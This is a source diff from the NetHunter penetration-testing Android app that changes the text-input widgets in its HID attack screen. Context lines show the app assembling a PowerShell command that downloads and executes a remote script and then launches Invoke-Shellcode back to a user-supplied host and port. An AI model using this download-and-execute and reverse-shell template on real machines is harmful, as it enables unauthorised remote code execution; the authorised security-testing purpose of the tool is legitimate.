@@ -20,6 +20,7 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Spinner;
 
+import com.google.android.material.textfield.TextInputEditText;
 import com.offsec.nethunter.utils.NhPaths;
 import com.offsec.nethunter.utils.ShellExecuter;
 
@@ -346,13 +347,13 @@ public class HidFragment extends Fragment {
                         return;
                     }
                     ShellExecuter exe = new ShellExecuter();
-                    EditText ip = getView().findViewById(R.id.ipaddress);
-                    EditText port = getView().findViewById(R.id.port);
+                    TextInputEditText ip = getView().findViewById(R.id.ipaddress);
+                    TextInputEditText port = getView().findViewById(R.id.port);
 
                     Spinner payload = getView().findViewById(R.id.payload);
                     String payloadValue = payload.getSelectedItem().toString();
 
-                    EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
+                    TextInputEditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
                     String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
                     String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
@@ -368,8 +369,8 @@ public class HidFragment extends Fragment {
         }
 
         private void loadOptions(final View rootView) {
-            final EditText payloadUrl = rootView.findViewById(R.id.payloadUrl);
-            final EditText port = rootView.findViewById(R.id.port);
+            final TextInputEditText payloadUrl = rootView.findViewById(R.id.payloadUrl);
+            final TextInputEditText port = rootView.findViewById(R.id.port);
             final Spinner payload = rootView.findViewById(R.id.payload);
             final ShellExecuter exe = new ShellExecuter();
 
@@ -404,7 +405,7 @@ public class HidFragment extends Fragment {
 
                     if (matcherIp.find()) {
                         String ipValue = matcherIp.group(1);
-                        EditText ip = rootView.findViewById(R.id.ipaddress);
+                        TextInputEditText ip = rootView.findViewById(R.id.ipaddress);
                         ip.setText(ipValue);
                     }
 
